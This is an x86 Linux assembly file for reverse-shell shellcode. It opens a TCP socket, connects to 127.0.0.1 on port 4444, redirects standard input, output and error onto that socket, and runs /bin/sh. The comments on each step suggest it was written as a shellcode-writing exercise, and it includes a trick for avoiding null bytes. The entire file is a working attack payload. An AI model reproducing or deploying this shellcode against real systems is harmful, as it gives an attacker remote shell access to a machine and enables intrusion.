global _start

section .text
  _start:
    ;; Create a socket
    ;; int socketcall(int call, unsigned long *args);
    ;; int socket(int domain, int type, int protocol);
    ;; #define SYS_SOCKET	1		/* sys_socket(2)		*/
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x1 ; sys_socket syscall number

    ;; Put the socket() args on the stack
    xor ecx, ecx
    push ecx ; Protocol INADDR_ANY Accept on any interface 0x00000000
    push ebx ; SOCK_STREAM is the type of socket 1

    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2

    mov ecx, esp ; save pointer to args for the socket() call
    int 0x80 ; call sys_socket

    ; save the returned listening socket file descriptor
    xor edi, edi
    mov edi, eax

    ;; Connect on the socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall

    ;; Start building the sockaddr_in structure
    ;; Since the structure is laid out as:
    ;; sin_family, sin_port, sin_addr
    ;; we need to push the values onto the stack
    ;; in reverse order
    ;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f
    ;; loop back addr is 127.0.0.1
    ;; this translates to 0x0100007f
    ;; we don't want to have null bytes 0x00
    ;; so we add 0x01010101 to our address
    ;; move it into a register
    ;; and then subtract
    xor ecx, ecx
    mov ecx, 0x02010180
    sub ecx, 0x01010101
    push ecx ; inet_addr("127.0.0.1) = 0x0100007f

    ;; 4444 is 0x115c in little endian. Network byte order is
    ;; Big endian so we swap the byte ordering
    push word 0x5c11 ; sin_port=4444 (network byte order)
    ;; bl is sys_connect syscallnumber 0x3
    ;; prior to the next instruction
    ;; subtract one to bring it to 0x2
    ;; which is what AF_INET represents
    inc ebx
    push word bx     ; sin_family=AF_INET (0x2)
    mov ecx, esp     ; move pointer to sockaddr_in structure


    ;; In the initial code we use sizeof to derive the addrlen
    ;; If we print the results of that we get 0x10 which is 16 bytes
    push 0x10 ;addrlen=16
    push ecx  ;sockaddr_in struct pointer
    push edi  ;sockfd
    mov ecx, esp ;save pointer to connect() args

    ;; Bring ebx back to sys_call # 3 for connect()
    inc ebx
    int 0x80 ; call sys_connect

    ;; call dup2 for stdin, stdout, and stderr in a loop
    xor ecx, ecx
    mov cl, 0x2 ;loop counter
    xor eax, eax
  dup2:
    mov al, 0x3f ;dup2
    int 0x80
    dec ecx
    jns dup2

    ;; Call execve
    xor eax, eax
    mov al, 0xb ;execve
    xor ebx, ebx
    push ebx
    push 0x68732f2f ;"sh//"
    push 0x6e69622f ;"nib/"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
